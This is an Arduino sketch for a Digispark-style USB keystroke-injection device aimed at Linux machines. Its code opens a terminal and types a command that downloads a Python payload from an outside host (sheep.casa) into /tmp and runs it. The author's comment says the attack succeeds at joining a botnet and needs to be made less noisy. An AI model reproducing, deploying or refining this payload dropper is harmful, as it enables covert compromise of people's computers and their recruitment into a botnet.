#include "DigiKeyboard.h"


/***
 * This is an attack for Linux machines, but it's more of a
 * proof of concept right now. The process is not hidden at all
 * and a user would clearly see some weird shit going down in a
 * terminal they didn't open. It does succeed at joining the botnet.
 * 
 * It needs to be made far less noisy.
 * 
 * 
 ***/

void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_T , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(600);
  
  DigiKeyboard.print("cd /tmp && wget https://sheep.casa/payloads/linux_payload.py && python ./linux_payload.py");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}


void loop() {
  
}
